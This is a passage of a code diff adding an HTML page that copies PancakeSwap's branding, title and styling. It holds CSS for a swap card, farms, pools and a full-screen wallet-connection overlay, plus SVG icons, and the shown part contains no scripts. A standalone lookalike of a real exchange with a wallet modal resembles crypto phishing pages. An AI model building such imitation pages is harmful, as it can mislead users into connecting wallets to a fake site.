@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<meta name="theme-color" content="#1FC7D4" />
+<meta name="description" content="Trade, earn, and own crypto on the all-in-one multichain DEX" />
+<meta property="og:title" content="PancakeSwap - Everyone's Favorite DEX" />
+<meta property="og:description" content="Trade, earn, and own crypto on the all-in-one multichain DEX" />
+<meta property="og:image" content="https://assets.pancakeswap.finance/web/og/v2/hero.jpg" />
+<title>PancakeSwap | Everyone's Favorite DEX</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Kanit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'><circle cx='20' cy='20' r='20' fill='%23633001'/><ellipse cx='20' cy='24' rx='12' ry='9' fill='%23fedc90'/><path d='M12 18c-1-6 2-10 4-6 1-4 6-4 8 0 2-4 5 0 4 6z' fill='%23d1884f'/></svg>">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Kanit,sans-serif;background:#0f1220;color:#f4eeff;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh}
+button{font-family:inherit;cursor:pointer;transition:all .15s}
+a{text-decoration:none;color:inherit}
+input{font-family:inherit;outline:none}
+svg{display:block;flex-shrink:0}
+:root{--bg:#0f1220;--card:#1c1f30;--card-2:#181b2a;--field:#242738;--input:#0f1220;--primary:#1fc7d4;--primary-text:#101425;--secondary:#a881fc;--green:#31d0aa;--blue:#4d8bff;--pink:#ed4b9e;--yellow:#ffc43c;--text:#f4eeff;--text-sub:#b8add2;--text-dim:#8f84ad;--border:#2e3142;--radius:24px;--radius-sm:16px;--radius-xs:12px}
+
+/* HEADER */
+header{position:sticky;top:0;z-index:100;background:rgba(15,18,32,.88);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}
+.hdr{max-width:1280px;margin:0 auto;display:flex;align-items:center;height:64px;padding:0 20px;gap:6px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:800;font-size:20px;flex-shrink:0;color:var(--text)}
+.logo-img{width:36px;height:36px}
+.nav{display:flex;align-items:center;gap:2px;margin-left:12px}
+.nav-it{position:relative;padding:6px 14px;border-radius:var(--radius-xs);font-weight:600;font-size:15px;color:var(--text-sub);display:flex;align-items:center;gap:6px;white-space:nowrap;border:none;background:transparent;height:38px}
+.nav-it:hover,.nav-it.act{color:var(--text);background:rgba(255,255,255,.04)}
+.nav-it .arw{font-size:7px;margin-top:2px;transition:transform .2s}
+.nav-it:hover .arw{transform:rotate(180deg)}
+.hdr-r{margin-left:auto;display:flex;align-items:center;gap:8px}
+.icn{width:38px;height:38px;border-radius:var(--radius-xs);border:none;background:transparent;color:var(--text-sub);display:grid;place-items:center;flex-shrink:0}
+.icn:hover{background:rgba(255,255,255,.06)}
+.icn svg{width:20px;height:20px}
+.hmb{display:none!important}
+@media(max-width:1024px){.nav{display:none}.hmb{display:grid!important}}
+
+/* DROPDOWN */
+.dd{position:absolute;top:calc(100% + 8px);left:0;min-width:230px;background:var(--card);border:1px solid var(--border);border-radius:var(--radius-sm);padding:8px;box-shadow:0 24px 60px -12px rgba(0,0,0,.6);opacity:0;visibility:hidden;transform:translateY(-6px);transition:all .2s;z-index:200}
+.nav-it:hover .dd{opacity:1;visibility:visible;transform:translateY(0)}
+.dd a{display:flex;align-items:center;gap:12px;padding:10px 14px;border-radius:var(--radius-xs);color:var(--text-sub);font-weight:500;font-size:14px}
+.dd a:hover{background:rgba(255,255,255,.04);color:var(--text)}
+.dd .di{width:28px;height:28px;border-radius:8px;display:grid;place-items:center;flex-shrink:0}
+.dd .dil{font-weight:600;font-size:14px;color:var(--text)}
+.dd .did{font-size:11px;color:var(--text-sub);margin-top:1px}
+.tag{display:inline-flex;align-items:center;gap:4px;font-size:10px;font-weight:700;padding:2px 8px;border-radius:20px;white-space:nowrap;height:20px}
+.tag-n{background:linear-gradient(90deg,#31d0aa,#1fc7d4);color:#07130f}
+.tag-h{background:rgba(237,75,158,.15);color:var(--pink)}
+
+/* HERO */
+.hero{background:radial-gradient(90% 70% at 12% 12%,rgba(45,58,120,.85) 0%,transparent 55%),radial-gradient(80% 80% at 92% 30%,rgba(72,45,110,.7) 0%,transparent 55%),linear-gradient(180deg,#22264d 0%,#241d43 45%,#0d0b16 82%,#0f1220 100%);position:relative;overflow:hidden}
+.hero-in{max-width:1280px;margin:0 auto;display:flex;align-items:flex-start;justify-content:space-between;gap:48px;padding:72px 20px 56px}
+.hero-copy{flex:1;min-width:300px;padding-top:28px}
+.hero-copy h1{font-size:clamp(40px,6vw,84px);line-height:.95;font-weight:800;letter-spacing:-1.5px}
+.hero-copy h1 .l1{display:block;color:#f4eeff}
+.hero-copy h1 .l2{display:block;background:linear-gradient(135deg,#a881fc 0%,#1fc7d4 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero-tag{font-size:clamp(17px,1.8vw,24px);font-weight:600;margin:24px 0 28px;color:#b8add2}
+.chains{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.chains .c{width:44px;height:44px;border-radius:50%;display:grid;place-items:center;box-shadow:0 4px 14px rgba(0,0,0,.4);flex-shrink:0}
+.chains .c img{width:28px;height:28px;border-radius:50%}
+.chains .c.add{background:rgba(31,199,212,.12);color:var(--primary);font-weight:800;font-size:18px;border:2px dashed rgba(31,199,212,.25)}
+
+/* SWAP */
+.swp{width:460px;flex-shrink:0}
+.scard{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:8px;box-shadow:0 24px 48px -16px rgba(0,0,0,.5);transition:box-shadow .3s}
+.scard:hover{box-shadow:0 24px 56px -12px rgba(0,0,0,.6)}
+.stabs{display:flex;gap:4px;padding:0 4px 6px}
+.stab{flex:1;padding:7px 0;border:none;border-radius:18px;font-weight:600;font-size:14px;background:transparent;color:var(--text-sub)}
+.stab.act{background:var(--primary);color:var(--primary-text);box-shadow:0 2px 8px rgba(31,199,212,.3)}
+.stab:not(.act):hover{background:rgba(255,255,255,.04)}
+.sfld{background:var(--field);border:1px solid transparent;border-radius:20px;padding:14px 18px;transition:border-color .2s}
+.sfld:focus-within{border-color:rgba(31,199,212,.35)}
+.sfld .sl{font-size:12px;color:var(--text-sub);font-weight:500;margin-bottom:6px}
+.sfld .sr{display:flex;justify-content:space-between;align-items:center;gap:12px}
+.tbtn{display:flex;align-items:center;gap:10px;cursor:pointer;background:none;border:none;color:inherit;padding:0}
+.tbtn .ti{width:30px;height:30px;border-radius:50%;overflow:hidden;flex-shrink:0;display:grid;place-items:center;background:var(--border)}
+.tbtn .ti img{width:100%;height:100%;display:block}
+.tbtn .tn{font-size:18px;font-weight:700;display:flex;align-items:center;gap:6px;color:var(--text)}
+.tbtn .tn .ar{font-size:9px;color:var(--text-sub);margin-top:1px}
+.ain{background:transparent;border:none;font-size:24px;font-weight:600;color:var(--text);width:150px;font-family:inherit;padding:0;text-align:right}
+.ain::placeholder{color:var(--text-dim)}
+.ausd{font-size:12px;color:var(--text-dim);margin-top:4px;text-align:right}
+.swch{display:flex;justify-content:center;margin:-6px 0;position:relative;z-index:2}
+.swch button{width:34px;height:34px;border-radius:50%;border:4px solid var(--card);background:var(--field);color:var(--primary);display:grid;place-items:center}
+.swch button:hover{background:var(--input);transform:rotate(180deg)}
+.swch button svg{width:16px;height:16px}
+.sdtl{padding:12px 6px;font-size:12px;color:var(--text-dim)}
+.sdtl .sr2{display:flex;justify-content:space-between;padding:4px 0}
+.sdtl .sr2 .slb{display:flex;align-items:center;gap:4px}
+.sbtn{width:100%;height:54px;border:none;background:linear-gradient(90deg,#1fc7d4,#31d0aa);color:#101425;font-weight:700;font-size:17px;border-radius:20px;box-shadow:0 -1px 0 3px rgba(0,0,0,.08) inset,0 -3px 0 rgba(0,0,0,.15) inset;letter-spacing:.3px}
+.sbtn:hover:not(:disabled){opacity:.9;transform:translateY(-1px);box-shadow:0 -1px 0 3px rgba(0,0,0,.08) inset,0 -3px 0 rgba(0,0,0,.15) inset,0 8px 24px rgba(31,199,212,.2)}
+.sbtn:disabled{background:var(--field);color:var(--text-dim);box-shadow:none;cursor:not-allowed;opacity:1}
+.sbp{padding:14px}
+
+/* TOAST */
+.tst{position:fixed;top:20px;right:20px;z-index:999999;background:var(--card);border:1px solid var(--border);border-radius:var(--radius-sm);padding:16px 20px;max-width:380px;box-shadow:0 10px 40px rgba(0,0,0,.6);animation:tin .3s ease-out;font-size:14px}
+.tst .tc{float:right;background:none;border:none;color:var(--text-dim);font-size:18px;cursor:pointer;padding:0 4px;line-height:1}
+.tst .tt{font-weight:600;margin-bottom:4px}
+.tst .ts{font-size:12px;color:var(--text-sub)}
+@keyframes tin{from{opacity:0;transform:translateX(30px)}to{opacity:1;transform:translateX(0)}}
+
+/* SECTIONS */
+.sec{max-width:1280px;margin:0 auto;padding:36px 20px}
+.sec-h{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
+.sec-t{font-size:clamp(24px,2.8vw,38px);font-weight:700}
+.sec-t .g{background:linear-gradient(135deg,var(--secondary),var(--primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.sec-l{color:var(--primary);font-weight:600;font-size:14px;display:flex;align-items:center;gap:6px}
+.sec-l:hover{opacity:.8}
+
+/* FARMS */
+.fg{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+@media(max-width:1024px){.fg{grid-template-columns:1fr}}
+.fc{background:var(--card-2);border:1px solid var(--border);border-radius:var(--radius);padding:20px 22px;transition:border-color .2s,transform .2s}
+.fc:hover{border-color:rgba(31,199,212,.15);transform:translateY(-2px)}
+.fch{display:flex;align-items:center;gap:12px;margin-bottom:14px}
+.fci{display:flex;align-items:center}
+.fci img,.fci svg{width:36px;height:36px;border-radius:50%;border:2px solid var(--card-2)}
+.fci img+img,.fci svg+svg{margin-left:-10px}
+.fcn{font-weight:700;font-size:16px}
+.fct{margin-left:auto;font-size:11px;font-weight:700;padding:3px 12px;border-radius:20px;background:rgba(49,208,170,.12);color:var(--green)}
+.fcs{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-bottom:14px}
+.fcs .fv{font-weight:700;font-size:15px}
+.fcs .fl{font-size:11px;color:var(--text-sub);font-weight:500}
+.fbar{height:6px;background:var(--field);border-radius:3px;overflow:hidden;margin-bottom:14px}
+.fbar .fi{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--primary),var(--green))}
+.fcb{display:flex;justify-content:space-between;align-items:center;font-size:12px;color:var(--text-sub)}
+
+/* POOLS */
+.pg{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+@media(max-width:1024px){.pg{grid-template-columns:1fr 1fr}}
+@media(max-width:640px){.pg{grid-template-columns:1fr}}
+.pc{background:var(--card-2);border:1px solid var(--border);border-radius:var(--radius);padding:22px;transition:border-color .2s,transform .2s}
+.pc:hover{border-color:rgba(31,199,212,.12);transform:translateY(-2px)}
+.pci{display:flex;align-items:center;margin-bottom:12px}
+.pci img,.pci svg{width:34px;height:34px;border-radius:50%;border:2px solid var(--card-2)}
+.pci img+img,.pci svg+svg{margin-left:-10px}
+.pcn{font-weight:700;font-size:17px;margin-bottom:4px}
+.pcd{font-size:12px;color:var(--text-sub);margin-bottom:16px}
+.pcs{display:flex;justify-content:space-between;margin-bottom:16px}
+.pcs .pv{font-weight:700;font-size:17px}
+.pcs .pl{font-size:11px;color:var(--text-sub);font-weight:500}
+.pcb2{width:100%;height:44px;border:none;border-radius:var(--radius-sm);font-weight:600;font-size:15px;background:var(--field);color:var(--text-sub)}
+.pcb2:hover{background:var(--border);color:var(--text)}
+
+/* PREDICTION */
+.prw{background:var(--card-2);border:1px solid var(--border);border-radius:var(--radius);padding:24px;position:relative}
+.prh{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+.prh .pht{font-weight:700;font-size:20px;display:flex;align-items:center;gap:8px}
+.prh .phr{font-size:13px;color:var(--text-sub);background:var(--field);padding:4px 16px;border-radius:20px}
+.prg{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+@media(max-width:640px){.prg{grid-template-columns:1fr}}
+.prc{border-radius:20px;padding:24px 20px;text-align:center;cursor:pointer;border:2px solid transparent;transition:transform .15s}
+.prc:hover{transform:scale(1.03)}
+.prc.up{background:rgba(49,208,170,.08);border-color:rgba(49,208,170,.2)}
+.prc.dn{background:rgba(237,75,158,.08);border-color:rgba(237,75,158,.2)}
+.prc .pel{font-size:42px;margin-bottom:6px}
+.prc .plb{font-weight:700;font-size:16px;margin-bottom:6px}
+.prc.up .plb{color:var(--green)}
+.prc.dn .plb{color:var(--pink)}
+.prc .pod{font-size:13px;color:var(--text-sub)}
+.prc .ppo{font-weight:700;font-size:20px;margin-top:4px;color:var(--text)}
+
+/* STATS */
+.sts{text-align:center;padding:36px 20px}
+.stsh{font-size:clamp(26px,3.8vw,50px);font-weight:700;line-height:1.1;margin-bottom:36px}
+.stsh .t1{color:var(--primary)}
+.stsh .t2{background:linear-gradient(135deg,var(--secondary),var(--primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.stsg{max-width:1120px;margin:0 auto;display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+@media(max-width:1024px){.stsg{grid-template-columns:1fr 1fr}}
+@media(max-width:640px){.stsg{grid-template-columns:1fr}}
+.stc{border-radius:var(--radius);padding:28px 18px;text-align:center}
+.stc .sk{font-size:15px;font-weight:600;margin-bottom:10px}
+.stc .sv{font-size:36px;font-weight:700;line-height:1}
+.stc .ss{font-size:12px;color:var(--text-dim);margin-top:8px;font-weight:500}
+.sc1{background:rgba(31,199,212,.07)}.sc1 .sk,.sc1 .sv{color:var(--primary)}
+.sc2{background:rgba(168,129,252,.08)}.sc2 .sk,.sc2 .sv{color:var(--secondary)}
+.sc3{background:rgba(77,139,255,.08)}.sc3 .sk,.sc3 .sv{color:var(--blue)}
+.sc4{background:rgba(237,75,158,.09)}.sc4 .sk,.sc4 .sv{color:var(--pink)}
+
+/* FOOTER */
+footer{background:var(--card-2);border-top:1px solid var(--border);padding:48px 20px 24px;margin-top:36px}
+.fi{max-width:1280px;margin:0 auto;display:grid;grid-template-columns:2fr 1fr 1fr 1fr 1fr;gap:32px}
+@media(max-width:1024px){.fi{grid-template-columns:1fr 1fr}}
+@media(max-width:640px){.fi{grid-template-columns:1fr}}
+.fb{font-size:13px;color:var(--text-sub);line-height:1.7;margin-bottom:16px;max-width:320px}
+.fbl{display:flex;align-items:center;gap:10px;font-weight:700;font-size:18px;margin-bottom:12px}
+.fbl svg{width:28px;height:28px}
+.fs{display:flex;gap:8px}
+.fs a{width:36px;height:36px;border-radius:10px;background:var(--field);display:grid;place-items:center;color:var(--text-sub);font-size:16px;transition:all .15s}
+.fs a:hover{background:var(--primary);color:var(--primary-text)}
+.fc .fct{font-weight:600;font-size:15px;margin-bottom:14px;color:var(--text)}
+.fc a{display:block;font-size:13px;color:var(--text-sub);padding:3px 0}
+.fc a:hover{color:var(--primary)}
+.fb2{max-width:1280px;margin:32px auto 0;padding-top:16px;border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;font-size:12px;color:var(--text-dim);flex-wrap:wrap;gap:8px}
+@media(max-width:640px){.fb2{flex-direction:column;text-align:center}}
+
+/* WALLET MODAL */
+.wmo{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:rgba(8,6,11,.92);display:flex;align-items:center;justify-content:center;font-family:Kanit,sans-serif;backdrop-filter:blur(8px)}
+.wm{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:28px;max-width:400px;width:92%;box-shadow:0 24px 60px -16px rgba(0,0,0,.7);animation:fadeIn .2s ease-out}
+@keyframes fadeIn{from{opacity:0;transform:scale(.93)}to{opacity:1;transform:scale(1)}}
+.wmh{display:flex;align-items:center;gap:12px;margin-bottom:6px}
+.wmh .whi{width:38px;height:38px;border-radius:var(--radius-xs);background:var(--primary);display:grid;place-items:center;flex-shrink:0}
+.wmh .wht{font-weight:700;font-size:18px}
+.wmc{margin-left:auto;background:none;border:none;color:var(--text-dim);font-size:22px;cursor:pointer;padding:4px 8px;border-radius:8px;line-height:1}
+.wmc:hover{background:rgba(255,255,255,.04)}
+.wms{font-size:13px;color:var(--text-sub);margin-bottom:18px}
+.wo{display:flex;align-items:center;gap:14px;background:var(--field);border-radius:var(--radius-sm);padding:14px 16px;margin-bottom:8px;cursor:pointer;transition:all .15s;border:1px solid transparent}
+.wo:hover{background:var(--input);border-color:rgba(31,199,212,.2);transform:translateX(2px)}
+.wo .woi{width:38px;height:38px;border-radius:10px;display:grid;place-items:center;flex-shrink:0;overflow:hidden;background:var(--border)}
+.wo .woi img{width:100%;height:100%;display:block}
+.wo .won{font-weight:600;font-size:15px;color:var(--text)}
+.wo .wod{font-size:11px;color:var(--text-sub)}
+.wo .woar{color:var(--text-dim);font-size:18px;margin-left:auto}
+.wmf{text-align:center;margin-top:16px;font-size:11px;color:var(--text-dim);line-height:1.5}
+.wmf a{color:var(--primary)}
+.woi svg{width:22px;height:22px}
+</style>
+</head>
+<body>
+
+<svg width="0" height="0" style="position:absolute" aria-hidden="true"><defs>
+<symbol id="ch" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M6 9l6 6 6-6"/></symbol>
+<symbol id="sv" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 5v14m0 0l-5-5m5 5l5-5"/></symbol>
+<symbol id="sr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4-4"/></symbol>
+<symbol id="st" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.6 1.6 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.6 1.6 0 0 0-1.8-.3 1.6 1.6 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.6 1.6 0 0 0-1-1.5 1.6 1.6 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.6 1.6 0 0 0 .3-1.8 1.6 1.6 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.6 1.6 0 0 0 1.5-1 1.6 1.6 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.6 1.6 0 0 0 1.8.3H9a1.6 1.6 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.6 1.6 0 0 0 1 1.5 1.6 1.6 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.6 1.6 0 0 0-.3 1.8V9a1.6 1.6 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.6 1.6 0 0 0-1.5 1z"/></symbol>
+<symbol id="ar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M5 12h14m-6-6l6 6-6 6"/></symbol>
+</defs></svg>
+
+<!-- CHAIN SVG ICONS -->
+<svg width="0" height="0" style="position:absolute"><defs>
+<g id="eth-icon"><circle cx="16" cy="16" r="16" fill="#627eea"/><path fill="#fff" d="M16 4v8.87l7.5 3.35z" opacity=".6"/><path fill="#fff" d="M16 4 8.5 16.22 16 12.87z"/><path fill="#fff" d="M16 21.97V28l7.5-10.38z" opacity=".6"/><path fill="#fff" d="M16 28v-6.03L8.5 17.62z"/><path fill="#fff" d="m16 20.57 7.5-4.35L16 12.87z" opacity=".2"/><path fill="#fff" d="M8.5 16.22 16 20.57v-7.7z" opacity=".6"/></g>
+<g id="bnb-icon"><circle cx="16" cy="16" r="16" fill="#f3ba2f"/><path fill="#fff" d="M12.116 14.404 16 10.52l3.886 3.886 2.26-2.26L16 6l-6.144 6.144zM6 16l2.26-2.26L10.52 16l-2.26 2.26zm6.116 1.596L16 21.48l3.886-3.886 2.26 2.259L16 26l-6.144-6.144zM21.48 16l2.26-2.26L26 16l-2.26 2.26zm-3.188-.002L16 18.294l-1.7-1.699-.196-.195-.4-.402.4-.402.196-.195L16 13.706z"/></g>
+<g id="sol-icon"><circle cx="16" cy="16" r="16" fill="url(#solg)"/><linearGradient id="solg" x1="0" y1="0" x2="32" y2="32"><stop offset="0" stop-color="#9945ff"/><stop offset="1" stop-color="#14f195"/></linearGradient><path fill="#fff" d="M9.5 20.5l3-4h8l-3 4zm0-5l3-4h8l-3 4z"/></g>
+<g id="matic-icon"><circle cx="16" cy="16" r="16" fill="#8247e5"/><circle cx="16" cy="16" r="6" fill="#fff" opacity=".9"/></g>
+<g id="arb-icon"><circle cx="16" cy="16" r="16" fill="#2d374b"/><path fill="#fff" d="M16 6l8.5 5v10L16 26l-8.5-5V11zm0 2l-6.5 3.8v7.5L16 23l6.5-3.8v-7.5z"/></g>
+<g id="op-icon"><circle cx="16" cy="16" r="16" fill="#ff0420"/><path fill="#fff" d="M16 6l8 5v10l-8 5-8-5V11z"/></g>
+<g id="cake-icon"><circle cx="16" cy="16" r="16" fill="#d1884f"/><circle cx="16" cy="19" r="9" fill="#fedc90"/><path d="M10 15c-1-5 2-9 4-5 1-4 6-4 8 0 2-4 5 0 4 5z" fill="#633001"/><circle cx="12" cy="19" r="1.3" fill="#452a1a"/><circle cx="20" cy="19" r="1.3" fill="#452a1a"/><circle cx="10" cy="21.5" r="1.3" fill="#f9a7c1"/><circle cx="22" cy="21.5" r="1.3" fill="#f9a7c1"/></g>
+<g id="eth-token"><circle cx="16" cy="16" r="16" fill="#627eea"/><path fill="#fff" d="M16 4v8.87l7.5 3.35z" opacity=".6"/><path fill="#fff" d="M16 4 8.5 16.22 16 12.87z"/><path fill="#fff" d="M16 21.97V28l7.5-10.38z" opacity=".6"/><path fill="#fff" d="M16 28v-6.03L8.5 17.62z"/><path fill="#fff" d="m16 20.57 7.5-4.35L16 12.87z" opacity=".2"/><path fill="#fff" d="M8.5 16.22 16 20.57v-7.7z" opacity=".6"/></g>
+<g id="usdt-icon"><circle cx="16" cy="16" r="16" fill="#26a17b"/><path fill="#fff" d="M17.5 12.5v-3h5v3h-1.5v-1.5h-2v1.5zm-5-3h5v3h-1.5V11h-2v1.5H8v-3h5v1.5H10.5V11h2V9.5zm10 3.5H8v1.5h14.5V13zm-4.5 4V10h-1.5v7h-3V10H7v7c0 2.2 4 4 9 4s9-1.8 9-4V10h-5.5v7h-3z"/></g>
+<g id="busd-icon"><circle cx="16" cy="16" r="16" fill="#f0b90b"/><path fill="#fff" d="M16 6l2.5 2.5L16 11l-2.5-2.5zm0 5l2.5 2.5L16 16l-2.5-2.5zm0 5l2.5 2.5L16 21l-2.5-2.5z"/></g>
+<g id="ic-swap"><path d="M7 16l-4-4 4-4m10 8l4-4-4-4M3 12h18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></g>
+<g id="ic-gear"><path d="M12 15a3 3 0 100-6 3 3 0 000 6z" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 01-2.83 2.83l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.17A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.17A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.17a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06A1.65 1.65 0 0019.4 9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.17a1.65 1.65 0 00-1.43 1z" fill="none" stroke="currentColor" stroke-width="1.8"/></g>
+<g id="ic-bridge"><path d="M5 12h14M12 5l-7 7 7 7" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></g>
+<g id="ic-farm"><rect x="4" y="8" width="16" height="12" rx="2" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M8 8V6a2 2 0 012-2h4a2 2 0 012 2v2" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M4 14h16" fill="none" stroke="currentColor" stroke-width="1.8"/></g>
+<g id="ic-pool"><circle cx="12" cy="12" r="8" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M12 8v8M8 12h8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></g>
+<g id="ic-stake"><path d="M12 2l4 6-4 4-4-4zM12 12l4 6-4 4-4-4zM6 8l4 4-4 4M18 8l-4 4 4 4" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></g>
+<g id="ic-chart-up"><path d="M3 17l5-5 4 4 5-7" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M17 9h4v4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></g>
+<g id="ic-chart-dn"><path d="M3 9l5 5 4-4 5 7" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M17 17V9h4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></g>
+<g id="ic-target"><circle cx="12" cy="12" r="8" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="12" cy="12" r="3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="12" cy="12" r="1" fill="currentColor"/></g>
+<g id="ic-reward"><circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M9 12l2 2 4-4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></g>
+<g id="ic-info"><circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M12 16v-4M12 8h.01" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></g>
+<g id="ic-ticket"><path d="M19 8V6a1 1 0 00-1-1H6a1 1 0 00-1 1v2m14 0a2 2 0 000 4v2a1 1 0 01-1 1H6a1 1 0 01-1-1v-2a2 2 0 000-4V6" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M10 11h4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></g>
+<g id="ic-nft"><rect x="3" y="5" width="18" height="14" rx="2" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="9" cy="11" r="2" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M21 15l-4-4-5 5-3-3-6 6" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></g>
+<g id="ic-dice"><rect x="4" y="4" width="16" height="16" rx="2" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="9" cy="9" r="1" fill="currentColor"/><circle cx="15" cy="9" r="1" fill="currentColor"/><circle cx="9" cy="15" r="1" fill="currentColor"/><circle cx="15" cy="15" r="1" fill="currentColor"/></g>
+<g id="ic-money"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 000 7h5a3.5 3.5 0 010 7H6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></g>
+<g id="ic-hamburger"><path d="M4 6h16M4 12h16M4 18h16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></g>
+<g id="ic-twitter"><path d="M20 6.5c-.7.3-1.4.5-2.2.6a3.8 3.8 0 001.7-2.1c-.8.5-1.6.8-2.5 1a3.8 3.8 0 00-6.5 3.5A10.8 10.8 0 014 5.5a3.8 3.8 0 001.2 5.1c-.6 0-1.2-.2-1.7-.5a3.8 3.8 0 003 3.8c-.6.1-1.1.2-1.7.1a3.8 3.8 0 003.6 2.6A7.6 7.6 0 014 18.5a10.7 10.7 0 005.8 1.7c7 0 10.8-5.8 10.8-10.8v-.5A7.7 7.7 0 0022 7.4c-.7.3-1.5.5-2.3.6z" fill="currentColor"/></g>
+<g id="ic-telegram"><path d="M21 5L2 12.5l7 2.6L17 9l-5.5 6.2L16 21l5-16z" fill="currentColor"/></g>
+<g id="ic-chat"><path d="M21 11.5a8.4 8.4 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.4 8.4 0 01-3.8-.9L3 21l1.9-5.7a8.4 8.4 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.4 8.4 0 013.8-.9h.5a8.5 8.5 0 018 8v.5z" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></g>
+<g id="ic-play"><polygon points="7 5 19 12 7 19 7 5" fill="currentColor"/></g>
+<g id="ic-camera"><path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2v11z" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="12" cy="13" r="4" fill="none" stroke="currentColor" stroke-width="2"/></g>
+<g id="ic-connect"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M15 12H3" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></g>
